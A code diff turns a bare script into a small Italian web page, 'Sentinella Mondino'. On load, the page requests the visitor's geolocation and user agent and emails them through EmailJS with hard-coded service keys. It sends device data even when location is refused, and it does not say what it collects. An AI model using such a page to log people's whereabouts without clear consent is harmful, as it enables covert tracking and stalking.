@@ -1,56 +1,69 @@
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Sentinella Mondino</title>
+</head>
+<body>
+    <h1>Sentinella Mondino Attiva</h1>
+    <p>Il segnale verrà inviato automaticamente...</p>
 
-<script>
-emailjs.init("htX2_6oDOj4VqH1pD"); // PUBLIC KEY
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
-function generateSessionID() {
-    return "SESSION-" + Math.random().toString(36).substring(2, 10).toUpperCase();
-}
+    <script>
+    emailjs.init("htX2_6oDOj4VqH1pD"); // PUBLIC KEY
 
-const sessionID = generateSessionID();
+    function generateSessionID() {
+        return "SESSION-" + Math.random().toString(36).substring(2, 10).toUpperCase();
+    }
 
-function deviceInfo() {
-    return navigator.userAgent;
-}
+    const sessionID = generateSessionID();
 
-function sendSignal(position) {
-    console.log("Invio segnale...");
+    function deviceInfo() {
+        return navigator.userAgent;
+    }
 
-    const data = {
-        session_id: sessionID,
-        user_agent: deviceInfo(),
-        timestamp: new Date().toLocaleString(),
-        lat: position?.coords?.latitude || "NEGATA",
-        lon: position?.coords?.longitude || "NEGATA",
-        accuracy: position?.coords?.accuracy || "N/A"
-    };
+    function sendSignal(position) {
+        console.log("Invio segnale...");
 
-    console.log("Dati inviati:", data);
+        const data = {
+            session_id: sessionID,
+            user_agent: deviceInfo(),
+            timestamp: new Date().toLocaleString(),
+            lat: position?.coords?.latitude || "NEGATA",
+            lon: position?.coords?.longitude || "NEGATA",
+            accuracy: position?.coords?.accuracy || "N/A"
+        };
 
-    emailjs.send(
-        "service_qf5owhx",
-        "template_signal",
-        data,
-        "htX2_6oDOj4VqH1pD" // 🔥 OBBLIGATORIA QUI
-    )
-    .then(() => console.log("Segnale inviato!"))
-    .catch(err => console.error("Errore invio:", err));
-}
+        console.log("Dati inviati:", data);
 
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            console.log("Posizione ottenuta:", pos);
-            sendSignal(pos);
-        },
-        err => {
-            console.warn("Geolocalizzazione negata:", err);
-            sendSignal(null);
-        }
-    );
-} else {
-    console.warn("Geolocalizzazione non supportata.");
-    sendSignal(null);
-}
-</script>
+        emailjs.send(
+            "service_qf5owhx",
+            "template_signal",
+            data,
+            "htX2_6oDOj4VqH1pD" // OBBLIGATORIA QUI
+        )
+        .then(() => console.log("Segnale inviato!"))
+        .catch(err => console.error("Errore invio:", err));
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                console.log("Posizione ottenuta:", pos);
+                sendSignal(pos);
+            },
+            err => {
+                console.warn("Geolocalizzazione negata:", err);
+                sendSignal(null);
+            }
+        );
+    } else {
+        console.warn("Geolocalizzazione non supportata.");
+        sendSignal(null);
+    }
+    </script>
+
+</body>
+</html>
 
